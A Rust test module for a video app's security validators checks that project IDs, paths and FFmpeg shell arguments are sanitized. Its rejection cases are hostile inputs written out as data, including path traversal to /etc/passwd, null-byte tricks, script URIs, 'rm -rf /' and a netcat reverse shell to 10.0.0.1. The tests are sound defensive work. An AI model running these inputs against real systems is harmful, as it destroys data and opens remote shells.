#[cfg(test)]
mod tests {
    use proptest::prelude::*;
    use super::super::security::*;

    #[test]
    fn test_validate_project_id_valid() {
        let valid_ids = vec![
            "proj_12345",
            "550e8400-e29b-41d4-a716-446655440000",
            "project-alpha-2026",
            "clip_99_render",
        ];
        for id in valid_ids {
            assert!(validate_project_id(id).is_ok(), "Expected valid project ID: {}", id);
        }
    }

    #[test]
    fn test_validate_project_id_rejects_traversal_and_bad_chars() {
        let invalid_ids = vec![
            "../secret",
            "../../etc/passwd",
            "dir/subproject",
            "dir\\subproject",
            "project\0null",
            "",
            "   ",
            "project;drop table",
            "project$evil",
        ];
        for id in invalid_ids {
            assert!(validate_project_id(id).is_err(), "Expected invalid project ID: {}", id);
        }
    }

    // ==========================================
    // SECURITY PATH TRAVERSAL UNIT TESTS
    // ==========================================

    #[test]
    fn test_rejects_path_traversal_parent_dir() {
        let malicious_paths = vec![
            "../etc/passwd",
            "../../secret.json",
            "videos/../../hidden",
            "C:\\Windows\\..\\System32",
            "/var/app/storage/../../../root",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected path traversal path: {}",
                path
            );
        }
    }

    #[test]
    fn test_rejects_null_byte_injection() {
        let malicious_paths = vec![
            "export.mp4\0.exe",
            "safe_image.png\0/../../etc/shadow",
            "\0malicious",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected null byte path: {}",
                path
            );
        }
    }

    #[test]
    fn test_rejects_control_characters() {
        let malicious_paths = vec![
            "export\nvideo.mp4",
            "media\r/file.mov",
            "track\tname.wav",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected control char path: {}",
                path
            );
        }
    }

    #[test]
    fn test_rejects_malicious_uri_schemes() {
        let malicious_paths = vec![
            "javascript:alert(1)",
            "data:text/html,<script>evil()</script>",
            "vbscript:msgbox",
        ];

        for path in malicious_paths {
            assert!(
                sanitize_and_validate_path(path).is_err(),
                "Should have rejected malicious scheme: {}",
                path
            );
        }
    }

    #[test]
    fn test_accepts_valid_safe_paths() {
        let safe_paths = vec![
            "/Users/dev/Videos/my_project.mp4",
            "C:\\Users\\dev\\Videos\\render.mov",
            "relative/path/to/media.png",
            "my-video_1080p.mp4",
        ];

        for path in safe_paths {
            assert!(
                sanitize_and_validate_path(path).is_ok(),
                "Should have accepted safe path: {}",
                path
            );
        }
    }

    // ==========================================
    // SHELL INJECTION DEFENSE TESTS
    // ==========================================

    #[test]
    fn test_rejects_shell_injection_tokens() {
        let injection_args = vec![
            "video.mp4; rm -rf /",
            "output.mov | nc -e /bin/sh 10.0.0.1 4444",
            "clip.wav & echo hacked",
            "$(whoami).mp4",
            "`id`.mov",
            "input.mp4 > /dev/null",
            "input.mp4 < /etc/passwd",
        ];

        for arg in injection_args {
            assert!(
                sanitize_shell_arg(arg).is_err(),
                "Should have rejected shell injection attempt: {}",
                arg
            );
        }
    }

    #[test]
    fn test_accepts_valid_ffmpeg_args() {
        let valid_args = vec![
            "-c:v",
            "libx264",
            "-preset",
            "fast",
            "-crf",
            "18",
            "yuv420p",
            "complex_filter_scale=1920:1080",
        ];

        for arg in valid_args {
            assert!(
                sanitize_shell_arg(arg).is_ok(),
                "Should have accepted valid FFmpeg arg: {}",
                arg
            );
        }
    }

    // ==========================================
    // PROPTEST PROPERTY-BASED TESTS
    // ==========================================

    proptest! {
        #[test]
        fn proptest_dimension_validation(w in 0u32..20000u32, h in 0u32..20000u32, fps in 0u32..600u32) {
            let res = validate_export_dimensions(w, h, fps);
            if w == 0 || h == 0 || w > 15360 || h > 8640 || fps == 0 || fps > 480 {
                prop_assert!(res.is_err());
            } else {
                prop_assert!(res.is_ok());
            }
        }

        #[test]
        fn proptest_audio_volume_validation(vol in -100.0f64..200.0f64) {
            let res = validate_audio_volume(vol);
            if vol.is_nan() || vol.is_infinite() || vol < 0.0 || vol > 10.0 {
                prop_assert!(res.is_err());
            } else {
                prop_assert!(res.is_ok());
            }
        }
    }
}
